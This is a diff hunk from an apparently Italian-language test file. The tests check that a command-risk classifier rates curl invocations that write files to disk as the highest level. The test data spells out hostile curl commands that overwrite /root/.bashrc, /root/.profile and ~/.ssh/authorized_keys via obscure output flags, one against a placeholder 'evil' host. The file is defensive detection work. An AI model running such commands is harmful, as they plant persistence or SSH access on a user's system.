@@ -595,7 +595,7 @@ test('livello 3 — #479: gli altri flag curl che fanno atterrare un file su dis
     'curl --hsts /root/.bashrc http://x',
     'curl --alt-svc ~/.ssh/authorized_keys http://x',
     'curl -w "%output{/home/user/.bashrc}ciao" http://evil/x',
-    "curl --write-out '%output{>>/root/.profile}x' http://x",
+    "curl -sw '%output{/root/.profile}x' http://x",   // dentro un bundle di short-flag
   ]) {
     assert.equal(lvl(cmd), 3, `"${cmd}" (fa atterrare un file) dovrebbe essere livello 3`);
   }
